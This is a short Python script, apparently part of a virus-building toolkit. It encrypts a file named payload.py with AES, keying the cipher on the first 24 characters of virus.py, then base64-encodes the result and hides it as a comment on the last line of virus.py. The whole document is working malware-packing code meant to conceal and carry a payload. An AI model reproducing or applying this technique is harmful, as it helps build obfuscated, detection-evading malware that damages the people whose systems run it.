import base64, sys, os, __main__; from Crypto import Random; from Crypto.Cipher import AES; from io import StringIO

virus = open('virus.py', 'r')

intialization_vector = Random.new().read(AES.block_size)
cipher = AES.new(StringIO(virus.read()).read(24), AES.MODE_CFB, intialization_vector)
encrypted = intialization_vector + cipher.encrypt(open('payload.py').read())

s = str(base64.b64encode(encrypted), 'utf-8')

#print(s)

lines = virus = open('virus.py', 'r').readlines()

#print(lines)

lines[-1] = '#' + s

virus = open('virus.py', 'w')

virus.writelines(lines)

virus.close()